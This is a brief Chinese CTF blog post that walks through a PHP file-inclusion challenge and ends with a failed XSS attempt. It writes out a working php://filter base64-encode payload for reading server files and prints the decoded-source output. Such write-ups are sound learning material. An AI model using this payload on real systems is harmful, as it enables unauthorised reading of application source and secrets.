---
layout:     post   				    # 使用的布局（不需要改）
title:       FileInclude			# 标题 
#subtitle:   脚本，xss #副标题
date:       2020-03-17 				# 时间
author:     s-seven 						# 作者
header-img: img/post-bg-2015.jpg 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								#标签
    - CTF
---

# FileInclude

上一篇博客我转载了一篇关于文件包含漏洞的知识总结，里面关于常见的几种文件包含函数有比较详细的解释，那我们来看一下这道题

![屏幕截图.jpg](http://ww1.sinaimg.cn/large/005KQQDely1gcx7osvhmtj30gm017glh.jpg)

**php://filter**：

可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。

我们利用这一条性质，开始时我构造的payload是：

`？page=php://filter/resource=flag.php`

发现不行

后来又构造了：

`?page=php://filter/read=convert.base64-encode/resource=flag`

将文件内容进行base64编码后显示在浏览器上，再自行解码

页面跳转，拿到一串字符

aGEgaGE/IHlvdSB3YW50IGZsYWc/IGZsYWcgaXMgaGVyZTw/cGhwDQovLyB0cnkgdG8gcmVhZCB0aGlzIHNvdXJjZSBjb2RlDQovLyRmbGFnID0gJ2ZsYWd7cmVhbGx5X2Jhc2ljX3NraWxsX3dlYl9kb2dfc2hvdWxkX2tub3d9JzsNCj8+LCBidXQgZG9uJ3QgbGV0IHlvdSBzZWUhDQo=

于是我拿到网页上的base64在线解码，拿到flag。

# XSS1

今天晚上还看了一下XSS1这道题，尝试用下面的符号来替换掉",<和>,但是仍然不能注入，尝试了几次都收不到消息，过两天再想想

![E2FA6B598A0149F096826B90C1971460.jpg](http://ww1.sinaimg.cn/large/005KQQDely1gcxbrihe2ej30kx00jq2w.jpg)

我的payload，但是不行= =

![屏幕截2.jpg](http://ww1.sinaimg.cn/large/005KQQDely1gcxbnax5pdj30zb0ijgnf.jpg)

